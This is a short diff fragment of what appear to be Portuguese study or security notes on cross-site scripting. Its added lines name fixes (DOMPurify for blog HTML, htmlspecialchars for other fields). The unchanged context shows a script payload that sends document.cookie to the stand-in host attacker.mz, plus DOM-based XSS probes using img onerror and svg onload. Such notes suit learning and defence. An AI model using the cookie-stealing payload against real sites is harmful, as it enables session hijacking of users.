@@ -59,6 +59,13 @@ ALTA
 <script>new Image().src='//attacker.mz/c?='+document.cookie</script>
 
 
+CORRECAO DA FALHA
+
+DOMPurify PARA TEXTO COMO OS DE BLOGS QUE PRECISAM RECEBER ALGUNS HTML PARA FORMATAR O ARTIGO
+
+PARA COMPOS NO GERAR
+htmlspecialchars
+
 # ───── XSS DOM (via #, não passa no servidor) ─────
 #<img src=x onerror=alert(1)>
 #<svg onload=alert(1)>
